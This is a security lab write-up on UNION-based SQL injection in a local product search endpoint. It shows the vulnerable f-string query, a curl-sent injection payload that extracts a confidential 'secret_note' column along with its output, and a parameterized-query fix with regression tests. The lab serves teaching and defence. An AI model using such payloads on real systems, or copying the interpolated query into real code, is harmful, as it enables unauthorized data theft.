# Lab 14 — SQL Injection in Product Search Filter

## 1. Objective

Demonstrate how string interpolation in SQL query construction allows UNION-based SQL injection to exfiltrate restricted database columns.

## 2. Scenario

An internal product catalogue allows employees to filter available inventory items by category. The application constructs a database query dynamically using the value of the `category` request parameter. The `products` table contains a sensitive column named `secret_note` holding confidential internal supplier terms and cost metrics that should not be visible to ordinary staff.

**Trust boundary:** The application assumed that category parameter values would consist exclusively of alphanumeric category names.

## 3. Preconditions

| Item | Value |
|------|-------|
| Target endpoint | `/lab/injection/inj-04/products/search` |
| Vulnerable parameter | `category` (query string) |
| Authenticated user | `alice` / `alice123` |
| Seed state | Initial database seed (`POST /reset`) |

## 4. Vulnerability Mechanism

The application constructs the SQL statement using formatted string interpolation:

```python
query = f"SELECT id, name, category, description, price, stock FROM products WHERE category = '{category}'"
rows = db.execute(query).fetchall()
```

An attacker can close the single quote and append a `UNION SELECT` query matching the six selected columns, mapping the sensitive `secret_note` column into one of the returned display fields (such as `name`).

## 5. Reproduction

1. Log in as `alice`:

```bash
curl -c cookies.txt -X POST http://localhost:5000/login \
  -d "username=alice&password=alice123"
```

2. Submit a category query containing a UNION payload designed to project `secret_note` into the second column (`name`):

```bash
curl -b cookies.txt "http://localhost:5000/lab/injection/inj-04/products/search?category=%27%20UNION%20SELECT%20999%2C%20secret_note%2C%20%27Exploit%27%2C%20%27Desc%27%2C%2013.37%2C%201%20FROM%20products%20WHERE%20secret_note%20IS%20NOT%20NULL--"
```

3. Parse the returned JSON array.

## 6. Evidence

The JSON response includes a synthesized product record where the `name` attribute contains the confidential supplier notes:

```json
[
  {
    "category": "Exploit",
    "description": "Desc",
    "id": 999,
    "name": "Internal cost: $120. Supplier: Acme",
    "price": 13.37,
    "stock": 1
  }
]
```

## 7. Root Cause

**File:** `app/routes/injection.py`  
**Function:** `lab14_product_search()`

The endpoint concatenates the untrusted `category` parameter directly into the SQL command string:

```python
if patched:
    rows = db.execute(
        "SELECT id, name, category, description, price, stock FROM products WHERE category = ?",
        (category,),
    ).fetchall()
else:
    query = f"SELECT id, name, category, description, price, stock FROM products WHERE category = '{category}'"
    rows = db.execute(query).fetchall()
```

## 8. Impact

An attacker can extract unauthorized data from any table accessible to the database user, bypass business authorization rules, or read internal credentials and confidential business records.

## 9. Remediation

Utilize parameterized queries (prepared statements) where parameters are bound by the database engine:

```python
rows = db.execute(
    "SELECT id, name, category, description, price, stock FROM products WHERE category = ?",
    (category,)
).fetchall()
```

## 10. Regression Validation

**Test:** `tests/test_lab_14.py`

- **Vulnerable mode:** UNION payload extracts `secret_note` values into product items.
- **Patched mode:** Injected UNION payload is treated as a literal string; zero products match.
- **Legitimate flow:** Querying `category=electronics` returns catalogue products.

## 11. Research Discussion

1. Why are prepared statements fundamentally resilient against SQL injection compared to input sanitization filters?
2. How do Object-Relational Mappers (ORMs) protect against SQL injection, and what edge cases (e.g. raw SQL clauses) bypass that protection?
3. What database privilege separation principles should be applied to limit data exposure in the event of an injection flaw?
